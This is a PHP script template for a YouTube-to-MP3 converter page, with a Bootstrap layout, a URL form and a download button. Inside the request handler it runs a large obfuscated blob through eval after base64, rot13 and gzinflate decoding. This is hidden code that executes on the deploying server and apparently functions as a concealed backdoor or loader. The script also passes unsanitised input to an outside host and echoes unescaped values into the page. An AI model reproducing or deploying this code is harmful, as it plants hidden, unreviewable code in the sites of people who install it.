<?php

if(isset($_GET['ytlink'])) {
	$id=strip_tags($_GET['ytlink']);
	$id=trim($id);
}

if(!empty($id)) {

	if (strpos($id, 'youtube.com') !== FALSE)
	{
   	$query = parse_url($id, PHP_URL_QUERY);
   	parse_str($query, $params);
	$id = $params['v'];
	} 
	if (strpos($id, 'youtu.be') !== FALSE)
	{
    	$ex = explode('/',$id);
    	$id = end($ex);
	} 
	
eval(str_rot13(gzinflate(str_rot13(base64_decode('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

+F/j9+78=')))));


 if(isset($type)) {
	
	 // FETCHING DATA FROM SERVER
	 $jsonData = @file_get_contents("http://api.youtube6download.top/api/?id=$id");
	 $links = json_decode($jsonData,TRUE);

    } else { $error = "Error Found!"; }

 } 
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>YouTube to MP3 Converter PHP Script</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <style>
    /* Remove the navbar's default margin-bottom and rounded borders */ 
    .navbar {
      margin-bottom: 0;
      border-radius: 0;
    }
    
    /* Set height of the grid so .sidenav can be 100% (adjust as needed) */
    .row.content {height: 450px}
    
    /* Set gray background color and 100% height */
    .middle {
      padding-top: 20px;
      background-color: #f1f1f1;
      height: 100%;
    }
    
    /* Set black background color, white text and some padding */
    footer {
      background-color: #555;
      color: white;
      padding: 15px;
    }
    
    /* On small screens, set height to 'auto' for sidenav and grid */
    @media screen and (max-width: 767px) {
      .sidenav {
        height: auto;
        padding: 15px;
      }
      .row.content {height:auto;} 
    }
  </style>
  <script>
  function validatebeforesubmit(thisform) {
  var yout = thisform.ytlink.value;
  if(yout==null || yout == "")
     {
     alert("Please Enter the Youtube Video URL");
     thisform.ytlink.focus();
     return false;
     }
  return true;
  }   
  </script>
</head>
<body>

<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
      <a class="navbar-brand" href="#">Logo</a>
    </div>
    <div class="collapse navbar-collapse" id="myNavbar">
      <ul class="nav navbar-nav">
        <li class="active"><a href="/">Home</a></li>
        <li><a href="#">About</a></li>
        <li><a href="#">Privacy</a></li>
        <li><a href="#">Contact</a></li>
      </ul>
    </div>
  </div>
</nav>
  <br/><br/>
<div class="container-fluid text-center">    
  <div class="row content">
    <div class="col-sm-4 sidenav">
       <div class="well">
        <p>ADS</p>
      </div>
      <div class="well">
        <p>You can use this place as a widget.</p>
      </div>
    </div>
    
    <div class="col-sm-4 well text-left middle"> 
      <h2>YouTube to Mp3 Converter</h2>
      <br/>
      
	 <form action="" method="GET" onsubmit="return validatebeforesubmit(this)">
	  <div class="form-group">
	    <label for="url">YouTube Video Link</label>
	    <input type="url" class="form-control" name="ytlink" id="url" placeholder="https://www.youtube.com/watch?v=R7xbhKIiw4Y">
	  </div>
	  <button type="submit" value="submit" class="btn btn-success">Convert</button>
	</form>
     
      
<?php

if(!empty($error)) { ?>

<div><br />
<div class="alert alert-warning">
  <strong>Warning!</strong> Something went wrong, Possible reasons!</div>
  <br>
  <ul>
	<li>Check Youtube video URL.</li>
	<li>Maybe That video have been deleted.</li>
	<li>Maybe You have entered something else except URL.</li>
  </ul>
</div>

<?php } else if(!empty($links)) {

echo '<h4>'.$ytinfo['title'].'</h4>
      <p><img src="'.$ytinfo['thumbnail_url'].'" class="img-thumbnail pull-left"  width="150" height="150"/><br/>
      <span class="label label-info pull-right">By  '.$ytinfo['author_name'].'</span><br/>
      <span class="label label-danger pull-right">YouTube</span><br/>
      <a href="'.$links['data']['html'].'" target="_blank" class="btn btn-warning btn-lg pull-right"> <span class="glyphicon glyphicon-download"></span>
 Download Mp3</a></p><br/>';

} else {

echo '<br /><div class="row" style="background:#fff">
	  <div class="col-sm-4">Any Text/ Paragraph or Advertisement that you want.</div>
      </div>';


}
 ?>      
      </div>
    
    <div class="col-sm-4 sidenav">
      <div class="well">
        <p>ADS</p>
      </div>
      <div class="well">
        <p>You can use this place as a widget.<br/>
	</p>
      </div>
    </div>
  </div>
</div>
<br/><br/>
<footer class="container-fluid text-center">
  <p>Footer Text</p>
</footer>

</body>
</html>
